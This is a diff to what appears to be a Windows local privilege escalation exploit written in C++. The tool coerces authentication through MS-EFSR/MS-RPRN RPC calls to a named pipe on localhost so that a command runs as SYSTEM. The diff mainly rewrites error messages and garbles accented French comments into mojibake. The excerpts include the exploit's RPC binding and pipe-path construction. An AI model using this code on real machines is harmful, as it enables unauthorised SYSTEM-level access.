@@ -18,6 +18,7 @@
 
 #include "lib/ms-efsr_h.h"
 #include "lib/ms-rprn_h.h"
+#include "win32errorcodes/c/win32errors.h"
 #include "CoerceFunctions.h"
 #include "CLI11.hpp"
 
@@ -47,22 +48,23 @@ wchar_t* generateRandomString() {
     return randomString;
 }
 
-void handleError(long result) {
-    wprintf(L"[*] Error code returned : %ld\r\n", result);
+void handleError(wstr function, long result) {
+    wprintf(L"[error] %s returned (%d): %s\r\n", function, result, lookup_error_with_nameW(result));
+
     if (result == 53) {
         wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
     }
     else if (result == 5) {
-        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one...\r\n");
+        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one ...\r\n");
     }
     else if (result == 50) {
-        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one...\r\n");
+        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one ...\r\n");
     }
     else if (result == 0) {
         wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
     }
     else {
-        wprintf(L" -> [-] Exploit failed, unknown error, trying another function...\r\n");
+        wprintf(L" -> [-] Exploit failed, unknown error, trying another function ...\r\n");
     }
 }
 
@@ -78,7 +80,7 @@ BOOL createRPCbind(RPC_BINDING_HANDLE& binding_h)
         (RPC_WSTR)L"ncalrpc", // Protocol used 
         nullptr,              // Endpoint (NULL for dynamic binding)
         nullptr,              // UUID (NULL for dynamic binding)
-        nullptr,              // Options (utilisez nullptr pour les options par défaut)
+        nullptr,              // Options (utilisez nullptr pour les options par dï¿½faut)
         &bindingString
     );
 
@@ -286,12 +288,12 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
     LPWSTR targetedPipeName;
     std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
     std::wstring filename = L"\\C$\\\x00";
-    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t)); // Allouez la mémoire
+    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t)); // Allouez la mï¿½moire
 
     if (targetedPipeName) {
-        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, chaine1.c_str()); // Copiez la chaîne chaine1
-        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, randomNamedpipe.c_str()); // Concaténez la chaîne randomNamedpipe
-        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, filename.c_str()); // Concaténez la chaîne randomNamedpipe
+        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, chaine1.c_str()); // Copiez la chaï¿½ne chaine1
+        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, randomNamedpipe.c_str()); // Concatï¿½nez la chaï¿½ne randomNamedpipe
+        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, filename.c_str()); // Concatï¿½nez la chaï¿½ne randomNamedpipe
 
     }
 
